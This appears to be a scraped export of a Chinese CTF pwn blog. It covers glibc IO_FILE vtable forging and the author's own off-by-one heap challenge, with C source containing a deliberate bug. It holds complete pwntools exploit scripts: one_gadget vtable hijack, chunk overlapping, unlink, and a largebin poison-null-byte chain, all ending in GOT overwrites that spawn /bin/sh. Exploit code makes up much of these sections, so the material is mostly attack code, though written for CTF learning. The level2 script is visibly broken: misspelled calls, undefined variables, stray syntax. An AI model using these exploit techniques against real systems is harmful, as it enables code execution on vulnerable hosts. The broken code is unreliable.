JUMP_FIELD(_IO_xsputn_t, __xsputn); JUMP_FIELD(_IO_xsgetn_t, __xsgetn); JUMP_FIELD(_IO_seekoff_t, __seekoff); JUMP_FIELD(_IO_seekpos_t, __seekpos); JUMP_FIELD(_IO_setbuf_t, __setbuf); JUMP_FIELD(_IO_sync_t, __sync); JUMP_FIELD(_IO_doallocate_t, __doallocate); JUMP_FIELD(_IO_read_t, __read); JUMP_FIELD(_IO_write_t, __write); JUMP_FIELD(_IO_seek_t, __seek); JUMP_FIELD(_IO_close_t, __close); JUMP_FIELD(_IO_stat_t, __stat); JUMP_FIELD(_IO_showmanyc_t, __showmanyc); JUMP_FIELD(_IO_imbue_t, __imbue); #if 0 get_column; set_column; #endif }; 这里vtable就像一个中转站，通过它调用_IO_jump_t中的各种函数。 比如说这里fread就是调用的_IO_file_xsgetn函数。 值得注意的是调用这个函数之前需要把它从vtable中取出从，然后才跳过去调用。 if (fp-&gt;_IO_buf_base &amp;&amp; want &lt; (size_t) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base)) { if (__underflow (fp) == EOF) break; continue; } 函数源码如上，实现的是一个键盘输入。 实际上orw三个功能的原理都差不多，都是经过vtable指针调用函数。只是最后的功能有区别而已。 伪造vtable在刚在的fread调用分析中我们认识到vtable实际上就是一个中转站，如果我们能够控制这个中转站的内容，我们也就相应地能够控制程序进行一些奇怪的操作了。 那么应该如何伪造vtable呢？目前有两种思路。 一种是直接修改vtable中的指针，进行一个任意地址读写，第二种是覆盖 vtable 的指针，使其指向一段可控的内存空间，也就相当于伪造vtable。 在libc2.23以后的版本vtable不能被直接写入数据，所以只能用第二种方法–伪造vtable。 但是我们先从第一个方法来试一试。 示例来源于ctf-wiki int main(void) { FILE *fp; long long *vtable_ptr; fp=fopen(\"123.txt\",\"rw\"); vtable_ptr=*(long long*)((long long)fp+0xd8); //get vtable vtable_ptr[7]=0x41414141 //xsputn printf(\"call 0x41414141\"); } 这边利用的具体步骤比较直观。 遍历 _IO_list_all ，然后调用 _IO_2_1_stdout_ 下的 vtable 中 _setbuf 函数。 承接上文的思路，我们需要在某个可控内存伪造vtable，然后修改_setbuf函数为关键内容。 在这道题中，我们可以在vtable附近修改两个字节构造fake vtable，然后利用三个字节改_setbuf为one_gadget。 开头直接给出了sleep函数的真实地址，程序内存地址完全暴露，我们可以通过它找到exit调用的stdout的地址。 pwndbg&gt; print _IO_2_1_stdin_ $2 = { file = { _flags = -72540024, _IO_read_ptr = 0x0, _IO_read_end = 0x0, _IO_read_base = 0x0, _IO_write_base = 0x0, _IO_write_ptr = 0x0, _IO_write_end = 0x0, _IO_buf_base = 0x0, _IO_buf_end = 0x0, _IO_save_base = 0x0, _IO_backup_base = 0x0, _IO_save_end = 0x0, _markers = 0x0, _chain = 0x0, _fileno = 0, _flags2 = 0, _old_offset = -1, _cur_column = 0, _vtable_offset = 0 '\\000', _shortbuf = \"\", _lock = 0x7ffff7dcf8d0 &lt;_IO_stdfile_0_lock&gt;, _offset = -1, _codecvt = 0x0, _wide_data = 0x7ffff7dcdae0 &lt;_IO_wide_data_0&gt;, _freeres_list = 0x0, _freeres_buf = 0x0, __pad5 = 0, _mode = 0, _unused2 = '\\000' &lt;repeats 19 times&gt; }, vtable = 0x7ffff7dca2a0 &lt;_IO_file_jumps&gt; } 我们可以看到vtable的地址是0x7ffff7dca2a0。 然后我们需要在它附近伪造一个vtable。 伪造的vtable需要符合以下条件：1:fake_vtable + 0x58=libc_base+off_3 完整exp from pwn import * context.log_level=\"debug\" libc=ELF(\"/lib/x86_64-linux-gnu/libc-2.23.so\") p = process('the_end') libc_base = long(sleep_ad,16) - libc.symbols['sleep'] one_gadget = libc_base + 0xf02b0 vtables = libc_base + 0x3C56F8 fake_vtable = libc_base + 0x3c5588 target_addr = libc_base + 0x3c55e0 for i in range(2): p.send(p64(vtables+i)) p.send(p64(fake_vtable)[i]) for i in range(3): p.send(p64(target_addr+i)) p.send(p64(one_gadget)[i]) p.sendline(\"exec /bin/sh 1&gt;&amp;0\") p.interactive() 总结伪造vtable算是io_file中比较简单好懂的一点了，只要对数据结构稍微熟悉一点就能很快理解。然后伪造的方式和思路也比较直接，可以说是经典pwn思路了//// 下一章我们将学习FSOP，感觉难度会比伪造vtable高出不少，其实只要沉下心来看都不难，最难的目前来说还是那些高版本的防护的绕过了。 FSOP上一part我们学习了如何通过伪造vtable加上打one_gsdget来getshell，理解起来比较简单，实际操作也并不复杂，只要能找到fake vtable的位置并且正确理解one gadget的用法就好。 这一个part我们学习FSOP。 ps：不管是fsop还是后面的glibc2.24下的伪造vtable在ctf中的考察都较少。但是不能说不重要吧/// FSOP 的核心思想就是劫持_IO_list_all 的值来伪造链表和其中的_IO_FILE 项","categories":[],"tags":[{"name":"io_file","slug":"io-file","permalink":"https://fuurinko.github.io/tags/io-file/"}]},{"title":"roputils使用tips","slug":"roputils","date":"2021-08-03T07:32:00.000Z","updated":"2021-08-03T07:43:37.423Z","comments":true,"path":"2021/08/03/roputils/","link":"","permalink":"https://fuurinko.github.io/2021/08/03/roputils/","excerpt":"","text":"做ret2dl的时候难免会偷懒使用工具。 但是这个工具并没有看起来那么和善。 就怎么使用utils包我都研究了一会儿，然后发现只需要import roputils然后把相对应的那个py脚本放到同一路径下就好。 但是紧接着第二问个问题，这个py脚本通篇是python2，而我日常无论哪个系统都是py3。 所以解决方式有2 将roputils转换为py3 ubuntu切换py版本 反正第一种就是用一个叫2to3的脚本。是py2自带的，使用需要先安装py2.7，我ubuntu18.04自带py2.7，所以就直接2to3 -w roputils.py 具体参数可以google。 然后又来了第三个问题。 来看我的报错。 [+] Starting local process './babystack': pid 745 Traceback (most recent call last): File \"babystack.py\", line 23, in &lt;module&gt; rop = roputils.ROP('./babystack') File \"/home/fur1n/pwn/week1/roputils.py\", line 440, in __init__ ELF.__init__(self, *args, **kwargs) File \"/home/fur1n/pwn/week1/roputils.py\", line 85, in __init__ m = re.search(r'^\\s*(?P&lt;key&gt;[^:]+):\\s+(?P&lt;value&gt;.+)$', line) File \"/usr/lib/python3.6/re.py\", line 182, in search return _compile(pattern, flags).search(string) TypeError: cannot use a string pattern on a bytes-like object 这个功能好像并不会在byte前加b。。。 目前来说并没有发现解决方法。 所以只能尝试更换默认的py版本。具体可以google","categories":[],"tags":[{"name":"mess","slug":"mess","permalink":"https://fuurinko.github.io/tags/mess/"}]},{"title":"patch'alarm","slug":"patch alarm","date":"2021-08-03T06:56:14.000Z","updated":"2021-08-03T07:32:55.996Z","comments":true,"path":"2021/08/03/patch alarm/","link":"","permalink":"https://fuurinko.github.io/2021/08/03/patch%20alarm/","excerpt":"","text":"比较弱智的一个操作，但是如果没注意到的话还是有一点点坑。 一般来说许多题都喜欢在main函数里加alarm。 alarm会导致调试的时候超时，如果没有解决的话基本不能调试。算最基础的的反调试手法了。 ps:关于超时的那个报错当时还好好研究了一会儿来着。就是一个sigxxx，sigalarm好像，然后默认返回中止程序。 解决方案也比较弱智。就是直接patch掉就好了。 ida都关了懒得上图了。","categories":[],"tags":[{"name":"mess","slug":"mess","permalink":"https://fuurinko.github.io/tags/mess/"}]},{"title":"SummerTask","slug":"summertask","date":"2021-08-02T10:25:35.000Z","updated":"2021-10-29T06:00:42.194Z","comments":true,"path":"2021/08/02/summertask/","link":"","permalink":"https://fuurinko.github.io/2021/08/02/summertask/","excerpt":"","text":"1）Summer_Havard1) 考点unlink chunk overlapping off by one/null 2）源码#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;string.h&gt; #include&lt;sys/stat.h&gt; #define MAX_IDX 100//the maximum number of songs which can be created #define MAX_SIZE 9999//the maximum size of your chunk //#define MAGICAL_IDX rand()%1000 // MAGICAL_IDX is a randow number in range of 0 - 1000. //#define MAGICAL_IDX 2 // MAGICAL_IDX is a randow number in range of 0 - 1000. //int MAGIC_NAME = 831;//the name of the target song to getshell struct song // create the struct of song { char *name; //the name of the song size_t size;//the size of the song }; struct song *songlist[MAX_IDX];//set the max number of the songs void menu() { puts(\"|----------------------------|\"); puts(\"| MY_PLAYER |\"); puts(\"|----------------------------|\"); puts(\"|1.DOWNLOAD THE SONG |\"); puts(\"|2.DELETE THE SONG |\"); puts(\"|3.LISTENING |\"); puts(\"|4.EDIT THE NAME OF THE SONG |\"); puts(\"|5.EXIT |\"); puts(\"|6.PWNED |\"); puts(\"|----------------------------|\"); puts(\"| ∧ ___ ∧ |\"); puts(\"| / ● ● | |\"); puts(\"| / - | |\"); puts(\"|----------------------------|\"); } void download() //add a new heap includeing a size chunk and content chunk. { int i; char buf[8];//the buffer of the read func . size_t size;//the size of the chunk. if (MAX_IDX &gt; 100) //set the range . { puts(\" MEMORY EXCESSIVE LOAD \"); return; } for (i = 0; i &lt; MAX_IDX; i++)//init the struct heap. { if (!songlist[i]) { songlist[i] = (struct song *)malloc(sizeof(struct song)); if (!songlist[i]) { puts(\"ALLOCA ERROR\"); exit(-1); } //error printf(\"SIZE OF THE SONG :\"); scanf(\"%ld\",&amp;size); if (size &gt; 0 &amp;&amp; size &lt; MAX_SIZE) { songlist[i]-&gt;name = (char *)malloc(size);//add a chunk to store the struct 'size' . if (!songlist[i]-&gt;name) { puts(\"ALLOCA ERROR\"); exit(-1); }//error printf(\"NAME :\"); read(0,songlist[i]-&gt;name,size); //scanf(\"%c\",&amp;(songlist[i]-&gt;name)); puts(\"DOWNLOAD SUCCESFULLY\"); break; } else { printf(\"(INVALID SIZE)\\n\" ); break; } } } } void delete()//delete { int idx; char buf[4]; printf(\"INDEX :\"); read(0, buf, 4); idx = atoi(buf); if (idx &lt; 0 || idx &gt;= 100) { puts(\"INVALID INDEX!!!\"); exit(0); } if (songlist[idx]) { free(songlist[idx]-&gt;name); free(songlist[idx]); puts(\"DELETE SUCCESFULLY\"); } else { puts(\"THE SONG DOESN'T EXIST!\"); } } void listen() { char buf[4]; int idx; printf(\"INDEX :\"); read(0, buf, 4); idx = atoi(buf); if (idx &lt; 0 || idx &gt; 100) { puts(\"INVALID INDEX!!!\"); exit(0); } if (songlist[idx]) { printf(\"YOU ARE LINTENING TO %s \",songlist[idx]-&gt;name); } else { puts(\"THE SONG DOESN'T EXIST!\"); } } void edit() { char buf[8]; int idx; size_t size; puts(\"NOW YOU CAN CHANGE YOUR SONG'S NAME!!\"); printf(\"INDEX OF YOUR TERGGER SONG: \"); scanf(\"%d\",&amp;idx); if(idx &lt; 0 || idx &gt; 100) { puts(\"INVALID INDEX!!!\"); exit(0); } printf(\"SIZE OF THE SONG :\"); read(0, buf, 8); size = atoi(buf); songlist[idx]-&gt;name = (char *)malloc(size);//add a chunk to store the struct 'size' . if (!songlist[idx]-&gt;name) { puts(\"ALLOCA ERROR\"); exit(-1); }//error if (songlist[idx]) { puts(\"CHANGE YOUR SONG NAME NOW :\"); read(0,songlist[idx]-&gt;name,size+1); puts(\"EDIT SUCCESFULLY\"); } else { puts(\"THE SONG DOESN'T EXIST!\"); } } int main() { int i = 0; setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 2, 0); char buf[4]; while (1) { menu(); puts(\"YOUR CHOISE :\"); read(0, buf, 4); //scanf(\"%d\",&amp;i); switch (atoi(buf)) { case 1: download(); sleep(1); break; case 2: delete(); sleep(1); break; case 3: listen(); sleep(1); break; case 4: edit(); sleep(1); break; case 5: exit(0); sleep(1); break; case 6: for(i;i&lt;20;i++) { printf(\"?????\\n\"); sleep(1); } break; default: puts(\"INVALID CHOISE!!!\"); break; } } return 0; } 3）解题分析1）漏洞点分析rin@fur1n:~/pwn$ checksec summer [*] '/home/rin/pwn/summer' Arch: amd64-64-little RELRO: NO RELRO Stack: Canary found NX: NX enabled PIE: NO PIE 无pie，无relro printf(\"NAME :\"); read(0, **((void ***)&amp;songlist + i), size + 1); puts(\"DOWNLOAD SUCCESFULLY\"); 一个很直观的漏洞点，read的时候会比原本规定的多读入一个字节，造成off by one。 2）漏洞利用分析这种堆题一个比较经典的思路就是悬垂指针的利用。利用fake chunk来修改指针造成任意地址写。但众所周知，在2.26后的对于prev_size的检测为无脑chunk overlapping增加了难度。所以这里分别将程序以libc2.23和libc2.27，2.29执行，并且分别分析对应的漏洞利用。 1) level0-baby_overlapping既然是单字节溢出，我们可以考虑修改chunk 的prev_size位后，控制这个chunk的指针，将它劫持到free或者show的got表地址然后leak libc基址。 核心利用思路与ctf wiki关于chunk overlapping上面的示例5一样。 申请两个chunk，然后编辑chunk0，利用off by one覆盖chunk1的prev_size位，然后释放chunk1，由于悬垂指针，我们可以重新add一个0x40大小的chunk1，用free的got表的地址覆盖指向chunk1的指针，再利用show（1）功能打印将它出来，这就完成了内存泄露。 然后利用free的真实地址进而计算出system的真实地址，继而在free的got的位置将free的got表值覆盖为system的地址，通过之前构造的chunk1的content中的\"/bin/sh\"进行系统调用并getshell。 exp如下。具体的细节说明在注释中。 from pwn import * context.terminal = [\"tmux\", \"splitw\", \"-h\"] r = process([\"./glibc/lib00/lib/x86_64-linux-gnu/ld-2.23.so\", \"./summer_1\"],env={\"LD_PRELOAD\":\"./glibc/lib00/lib/x86_64-linux-gnu/libc.so.6\"})#switch the verion of libc context.log_level = 'debug' libc = ELF('./glibc/lib00/lib/x86_64-linux-gnu/libc-2.23.so') elf = ELF('./summer_1') def add(size,content): r.sendline(\"1\") r.sendafter(\":\",str(size)) r.sendafter(\":\",content) def delete(idx): r.sendline(\"2\") r.sendafter(\":\",str(idx)) def show(idx): r.sendline(\"3\") r.sendafter(\":\",str(idx)) def edit(idx,content): r.sendline(\"4\") r.sendafter(\":\",str(idx)) r.sendafter(\":\",str(content)) def dbg(): gdb.attach(r) pause() free_got = 0x4036E8 add(0x18, b\"aaaa\") # chunk0 add(0x10, b\"bbbb\") # chunk1 edit(0, b\"/bin/sh\\x00\" + b\"a\" * 0x10 + b\"\\x41\") #construct thestruction of chunk0 for the application later. #Especially the str('/bin/sh')to trigger the system execve() #dbg() delete(1)#free chunk1,then the 41 will become the size of chunk1 add(0x20, p64(0) * 4 + p64(0x20) + p64(elf.got['free'])) #overlap the chunk1 show(1) free_addr = u64(r.recvuntil(\"DOWNLOAD SUCCESFULLY\")[:-5].ljust(8, \"\\x00\")) libc_base = free_addr - libc.symbols['free'] print(hex(libc_base)) system_addr = libc_base + libc.symbols['system'] #leak edit(1, p64(system_addr)) show(1) delete(0) r.interactive() 2）level1-eazy_unlink虽然直接修改prevsize位造成堆叠非常简单，但是我们也可以利用unlink中的思路，在chunk中构造fakechunk，通过off by one/null 触发unlink造成堆叠。这并不是特地绕远路，在level2中我们无法直接单字节溢出，必须用到ulnink。 那为什么利用unlink能构造堆叠呢？详见extra。 构造出堆叠以后的利用就相对模版化，因为保护同样还是只有nx和canary，我们可以很方便地同无保护的堆叠一样修改chunk的指针为free的got表地址来泄露程序的内存布局，然后再用system的got表值把free的got表值覆盖。 具体的细节分析如下。 1）堆风水构造ps：程序会先分配一个0x20的chunk储存size。但是效果是一样的 add(0xf8,b'aaaa')#chunk0，用来写system的参数 add(0xf8,b'bbbb')#chunk1#在其中伪造fake chunk add(0xf8,b'cccc')#chunk2#触发unlink add(0xf8,b'dddd')#chunk3,用来防止free chunk 与 top chunk 合并 连续申请4个chunk，大小都是0xf8。 0xf8这个数字的来源如何？ 分配0xf8的content，实际在内存中是0x101。 为什么是0x101？ 首先我们要实现空字节溢出，一般来说是溢出一个/x00。如果chunk的size过小，先不说free以后分配的chunk的种类，单是空字节溢出也会使得size变成0，这里只有当原本的size是三位数的时候溢出才有意义。 其次还涉及到prec size的在内存的位置问题。 详细分析参见exrta。 2）利用off by null 进行unlinkpayload = p64(0x110)#prev_size payload += p64(0xf1)#size payload += p64(next_chunk_addr - 0x18)#fd payload += p64(next_chunk_addr - 0x10)#bk payload += b'a'*0xd0#堆的大小减去伪造的heap头，0x100-0x8*5 payload += p64(0xf0)#next_prev_size，利用了off by null的单字节溢出 edit(1,payload) delete(2)#触发unlink、，造成堆叠 这里开始进行unlink操作。 首先确定fd，bk地址。确定地址的思路事实上就是之前提到过的，extra部分中对于unlink利用的概述。 所以我们使用的是next_chunk_addr - 0x18/0x10。 Nextchunk addr的地址则是chunk2 ptr。可以通过调试得到具体的值即0x6024b0 并且我们通过空字节溢出使得next chunk的prev size位为F0，它将prev inuse改成了00，使得程序认为chunk1是一个free chunk，当我们释放chunk2，就会触发chunk1的unlink。 而且根据unlink的原理，这段exp使得这个fake chunk的地址向下减少了0x18.(ps:64bit下） 意味着chunk1已经和chunk2形成了堆叠。 具体还是参见extra 堆叠的形成意味着我们可以通过更改chunk1的内容改变它的指针。 payload1 = p64(0xf8)#size payload1 = p64(free_got_addr)#利用堆叠更改chunk1的指针 edit(1,payload1） show（1）#此时打印出chunk1的内容，即为free的真实地址 3）完整exp： from pwn import * context.terminal = [\"tmux\", \"splitw\", \"-h\"] r = process([\"./glibc/lib00/lib/x86_64-linux-gnu/ld-2.23.so\", \"./summer_1\"],env={\"LD_PRELOAD\":\"./glibc/lib00/lib/x86_64-linux-gnu/libc.so.6\"})#switch the verion of libc context.log_level = 'debug' libc = ELF('./glibc/lib00/lib/x86_64-linux-gnu/libc-2.23.so') elf = ELF('./summer_1') def add(size,content): r.recvuntil(\":\") r.sendline(\"1\") r.sendlineafter(\":\",str(size)) r.sendlineafter(\":\",content) def delete(idx): r.recvuntil(\":\") r.sendline(\"2\") r.sendlineafter(\":\",str(idx)) def show(idx): r.recvuntil(\":\") r.sendline(\"3\") r.sendlineafter(\":\",str(idx)) def edit(idx,content): r.recvuntil(\":\") r.sendline(\"4\") r.sendlineafter(\":\",str(idx)) r.sendlineafter(\":\",str(content)) def dbg(): gdb.attach(r) pause() unlink_addr = 0x6024b0 free_got_addr = 0x4036E8 next_chunk_addr = unlink_addr add(0xf8,b'aaaa')#chunk0，用来写system的参数 add(0xf8,b'bbbb')#chunk1#在其中伪造fake chunk add(0xf8,b'cccc')#chunk2#触发unlink add(0xf8,b'dddd')#chunk3,用来防止free chunk 与 top chunk 合并 payload = p64(0x100)#prev_size payload += p64(0xf1)#size payload += p64(next_chunk_addr - 0x18)#fd payload += p64(next_chunk_addr - 0x10)#bk payload += b'a'*0xd0#堆的大小减去伪造的heap头，0x110-0x8*5 payload += b'0xf0'#next_prev_size edit(1,payload) delete(2)#触发unlink，造成堆叠 payload1 = p64(0xf8)#size payload1 += p64(free_got_addr)#利用堆叠更改chunk1的指针为free的got表 edit(1,payload1) show(1)#此时打印出chunk1的内容，即为free的真实地址 #leak free_addr = u64(r.recvuntil(\"DOWNLOAD SUCCESFULLY\")[:-5].ljust(8,\"\\x00\")) libc_base = free_addr - libc.symbols['free'] print(hex(libc_base)) system_addr = libc_base + libc.symbols['system'] edit(1,p64(system_addr))#更改free的got表值为system函数的真实地址 edit(0,\"/bin/sh\\x00\")#将chunk0的内容填充为binsh，作为下面执行函数的参数 delete(0)#由于free的got表值已经被篡改为system，所以调用free即调用system。 r.interactive() 3）level2-harder_unlink2.29以后glibc代码中增加了对于prev_size的检测 /* consolidate backward */ if (!prev_inuse(p)) { prevsize = prev_size (p); size += prevsize; p = chunk_at_offset(p, -((long) prevsize)); if (__glibc_unlikely (chunksize(p) != prevsize)) malloc_printerr (\"corrupted size vs. prev_size while consolidating\"); unlink_chunk (av, p); } 来对抗单字节溢出。 检测的内容也很好理解，如果当chunk的size位如果与next chunk的prev_size位不相等即报错。这个检测使我们很难直接通过单字节溢出来控制prev size位。 那么我们应该如何绕过它呢？ 很自然地我们想到可以更改next chunk的prev_size，但是仔细想想就会发现这是个无尽套娃。基本不可能。 既然想不出简单的办法绕过，那我们就干脆不修改prev_size了。 一般的poison null byte是通过伪造fd和bk位来伪造fake chunk的地址，使得地址向低地址移动，既然现在不好控制，那么如果内存上有现成的fd和bk供我们利用呢？我们是不是可以利用它们来控制fake chunk—-确有其事，比如说largebin chunk的fd_nextsize,bk_nextsize。 我们可以以fd_nextsize作为fake chunk的fd，bk_nextsize作为fake chunk的bk。 由于fd_nextsize和bk_nextsize用于指向第一个与自己大小不同的chunk，当largebin中只有一个chunk，这两个指针都是指向chunk本身。 具体见extra部分中对于largebin的概述。 利用方式则是： 申请两个较大的chunk后再释放，要求chunk进入unsorted bin。 将一个largebin申请回来。 在这个largebin chunkA内构造fake。在原本chunkA的bk位置写fake chunk的size位，也就是将fake chunk构建在chunk+0x10处。 然后处理fake chunk的fd和bk位。目的是以chunkA的fd_nextsize指针作为fake chunk的fd位，bk_nextsize指针作为fake chunk的bk。首先是fake chunk的fd位，把chunkA的fd_nextsize指针覆盖到一个可以控制的其bk位的 chunkB上，再伪造chunkB的bk位使其指向fake chunk即可。 对于fake chunk的bk位，按照检测，要触发unlink，bk必须指向fake chunk本身，也就是chunkA+0x10处，这里我们可以利用fastbin的特性，将一个fastbin chunk作为跳板绕过。 fake chunk构造完成后直接free chunkA，触发unlink，造成堆叠。可以利用它leak，然后改free got表。 我们通过exp和图示来理清楚。 由于并没有开启地址随机化，所以地址的覆盖并不需要部分覆写。 前三步可以用下面的图表来说明： 首先将tcache填满。 for a in range(7): add(0x1000,b'fill') delete(a) for b in range(7): add(0x1020,b'fill') delete(b) for c in range(7): add(0x20,b'fill') delete(c) 然后让chunk21成为largebin chunk add(0x500,b'largebin chnuk0')#chunk21 add(0x20,b'top')#chunk22 delete(21) add(0x1000,b'functional gadgets')#chunk23,to push the chunk21 to largebin #有关这一步的具体说明可以看Tcache部分。 至此我们获得了一个0x500大小的largebin chunkA，此时这个chunkA的状态还是free。 然后我们要在chunkA的header开始伪造fake chunk。 这是比较关键的一部分。利用到了large bin遗留在内存上的fd_nextsize 和 bk_nextsize 指针。以 fd_nextsize 为 fake_chunk 的 fd，bk_nextsize 为 fake_chunk 的 bk。但是我们首先需要绕过unlink的安全检测，即之前说过的Fd-&gt;bk = p, BK-&gt;fd = p ps：我们伪造的fake chunk是smallbin chunk，在bin中也是由双向链表维护。 我们分别为FD-&gt;bk = p和BK-&gt;fd = p进行绕过 首先是FD-&gt;bk = p的绕过。 回忆一下之前level1我们绕过的方法论，也就是： FD-&gt;bk = p ==&gt; bk_nextsize = p 所以我们的目的是让bk_nextsize指向fake chunk。 BK-&gt;fd = p的绕过同理，等价于构造fd_nextsize，使它指向fake chunk。 但是有趣的是此时我们的largebin中只有一个largebin chunk，它的fd_nextsize,bk_nextsize本身就是指向chunk本身的。然而这样没有任何意义，我们需要修改fd_nextsize到我们需要的地方。 这便又是问题所在。我们需要找到一个方法使得修改fd_nextsize的同时又能绕过检测。 这里我们需要用到其他类型bin chunk的辅助。 我们可以很容易地控制fd_nextsize指向某个smallbin chunkC，而这个smallbin chunkC的fd也指向堆上的某个地址。我们又可以通过修改这个chunkC的fd指针使得它指向fake chunk。这样一来我们利用 chunkC充当中间角色，绕了一圈使得我们目的达成的同时也没有被检测绊住。 然后来看实际操作。 add(0x28,p64(0) + p64(0x530) + p64(chunkC_addr))#fake chunk 先申请一个chunkB，用来构造fake chunk的size和fd指针。这里fake chunk fd还只是指向chunkC，我们需要修改chunkC的fd指针使它指向fake chunk。 修改chunk header需要利用到悬垂指针。我们下一步应该是构造出chunkC的悬垂指针。 比如从 small bin中拿出的chunk，如果其bin中有多个chunk的话，那么拿出来的chunk的bk上必定残留了指针，因此可以进行覆盖。 这里稍微有一些能讲的基础知识。还是参见extra吧。 add(0x28,b'a') #24 add(0x28,b'a') #25 add(0x28,b'a') #26 add(0x28,b'a') #27 add(0x600,b'a') #28,off by null for i in range(7): add(0x28,'tcache') for i in range(7): delete(23 + i)#填充tcache 多申请一些chunk。 delete(24) delete(25) #将chunk24，25free到fastbin add(0x400,b'aa')#28，smallbin #申请chunk28后fastbin里的两个chunk被放入small bin。这里的相关机制可以来看看extra。 add(0x28,p64(fake_chunk_addr))#24，再次申请，堆上遗留了bk指针，可以直接覆盖为目标地址 这样一来我们成功使得fd位指向fake chunk，并绕过了FD-&gt;bk = p 然后是bk_nextsize = p的绕过： 因为bk_nextsize本身指向chunkA，我们还是需要伪造它使得bk_nextsize指向chunkA + 0x10。 对于这个检测我们依旧要利用到别的chunk的帮助 for i in range(7): add(0x28,'tcache') for i in range(7): delete(28 + i)#填充tcache add(0x28, 'a')*#23,Tcache free(20) free(23) for i in range(7): add(0x28, 'a') add(0x28, p64(fake_chunk_addr)) 然后进行unlink。 unlink的触发实际上只需要用off by null向下一个chunk溢出空字节，再free被溢出的chunk就行 add(0x28,b'aa') edit(28,b'a'*0x20 + p64(0x520)) delete(28) 整个过程的示意图如下：其中chunk ptr指large bin残留的指针。 完整exp： from pwn import * r = precess('./summer2') context.log_level = 'debug' libc = ELF('./libc-2.29.so') unlink_addr = 0x6024b0 free_got_addr = 0x4036E8 next_chunk_addr = unlink_addr def add(size,content): r.sendline(\"1\") r.sendafter(\":\",str(size)) r.sendafter(\":\",content) def delete(idx): r.sendline(\"2\") r.sendafter(\":\",str(idx)) def show(idx): r.sendline(\"3\") r.sendafter(\":\",str(idx)) def edit(idx,content): r.sendline(\"4\") r.sendafter(\":\",str(idx)) r.sendafter(\":\",str(content)) def dbg(): gdb.attach(r) pause() #----------------Tcache------------------- for a in range(7): add(0x1000,b'fill') delete(a) for b in range(7): add(0x1020,b'fill') delete(b) for c in range(7): add(0x20,b'fill') delete(c) #-----------chunk constrution-------------- add(0x500,b'largebin chnuk0')#chunk21 add(0x20,b'top')#chunk22 delete(21) add(0x1000,b'functional gadgets')#chunk23,to push the chunk21 to largebin #-------fake chunk construction------------ add(0x28,p64(0x530) + p64(chunkC_addr))#fake chunk add(0x28,b'a') #24 add(0x28,b'a') #25 add(0x28,b'a') #26 add(0x28,b'a') #27 add(0x600,b'a') #28,off by null for i in range(7): add(0x28,'tcache') for i in range(7): delete(23 + i)#填充tcache #-------FD-&gt;bk = p------------------------- delete(24) delete(25) #将chunk24，25free到fastbin add(0x400,b'aa')#28，smallbin #申请chunk28后fastbin里的两个chunk被放入small bin。 add(0x28,p64(fake_chunk_addr))#24，再次申请，堆上遗留了bk指针，可以直接覆盖为目标地址 #-------BK-&gt;fd = p------------------------- for i in range(7): add(0x28,'tcache') for i in range(7): delete(28 + i)#填充tcache add(0x28, 'a')*#23,Tcache free(20) free(23) for i in range(7): add(0x28, 'a') add(0x28, p64(fake_chunk_addr)) #-------unlink----------------------------- add(0x28,b'aa') edit(28,b'a'*0x20 + p64(0x520)) delete(28) #-------leak------------------------------- show(21) free_addr = u64(r.recvuntil(\"DOWNLOAD SUCCESFULLY\")[:-5].ljust(8, \"\\x00\")) libc_base = free_addr - libc.symbols['free'] print(hex(libc_base)) system_addr = libc_base + libc.symbols['system'] edit(1, p64(system_addr)) show(1) delete(0) r.interactive() 4)总结不管是level0还是level1、level2，其实都是off by one庞大利用方式中比较基础的点。 level2的思路很有趣。 不管怎样万变不离其中，off by one/null可以导致一个字节的的溢出以修改chunk header，从而触发各种各样的漏洞利用。 5）军训？考核？大冒险！原本是计划三道题。一道full relro的ret2dl，一道多线程或者xtea加密的re，一道简单off by one（就是summer）。 在军训一天后觉得出三道题，这确实是不可能的事。累倒不累，主要是时间都是碎片化的不好利用。 当时考核发布的时候我们都觉得时间是充足的，能先花时间学考点而不是研究怎么做考核。实际上考核一公布我就写了summer的大概框架，之前没有怎么从源码层面上阅读堆题，甚至那个时候也是刚刚接触堆半个月，所以写得很艰难，大概花了一周的时间把程序完善。后来发现了一个很严重的非预期，觉得自己有点急于求成，对堆一知半解的就想出堆题是不是有点不识好歹了，就暂时放下了考核而开始研究堆题的考点。这期间我也一直认为军训完还有充足的时间来完善题目。 再后来三道题变成了一道题。 很遗憾没有在考核期间完成full relro的ret2dl。。不过有没有作为考核完成也不是特别重要了，我已经部分翻译了原文相关的部分，打算暑假认真调试一下。。。 大概七号的时候就完成了level0和1，本来最初计划就是这两个level的，但是不知道为什么想不开加了level2，学得很艰难。并且 感觉写的支离破碎的，说白了我的知识面不足以支撑我完全理解这个检测的绕过方法，所以一些东西写得十分离奇。比如通篇几乎没有用到edit功能，因为参考的wp的原题都是没有这个功能的。 很让我恼火的就是我对于largebin、smallbin还有Tcache的机制不甚熟悉，而解题中涉及到的堆指针覆写的很多姿势实际上都是基于这些bin特有的机制。 说实话有点惭愧，大一上我干了啥呢。啥也没干。 硬着头皮看🐟最早分享的长亭二进制入门课，那时我愿称之为天书。 做签到栈溢出，复制别人的exp打，搞半天都连接失败，死也打不通。 就跟忘记了当初为什么要学习二进制一样，我也忘记了当时为什么我要每天晚上看那个nep的直播课，忘记做考核的那种不做出来就跳楼的决心来自哪里。 相似地，我还忘记了我为什么要学pwn，而不是我比较憧憬的游戏安全。 就好像一件事情的发生通常拥有直接原因和根本原因，而我的一系列行径是没有直接原因的，并没有什么很直接的驱动力或者很特别的理由。 这是一件非常奇怪的事情。通常来说我是一个比较有明确目标的人，但是在这种关键的事情上我的选择却不是由我本人决断的。 这果然是一件非常奇怪的事情，硬要类比，可以来一句经典名言：” 爱也如此。” 6）extra（慎重观看）extra部分。 多为调试时遇到的环境问题或者一些懂的都懂不必多说的基础知识。 但是怕被说水考核就加上了。 pps：平时文档写多了总有一种奇怪的引导的语气。。。要多具体有多具体的那种，所以废话以及不必要的操作巨多，慎重观看。 ppps：只要我的解题的思路的正文部分足够简略清爽，就不会有人说我拖泥带水（） 调试部分1.1-解决gdb无法查看heap等信息的问题指定libc加载后进行调试。发现gdb无法显示当前的堆块以及链表信息。 hea heap: This command only works with libc debug symbols. They can probably be installed via the package manager of your choice. See also: https://sourceware.org/gdb/onlinedocs/gdb/Separate-Debug-Files.html E.g. on Ubuntu/Debian you might need to do the following steps (for 64-bit and 32-bit binaries): sudo apt-get install libc6-dbg sudo dpkg --add-architecture i386 sudo apt-get install 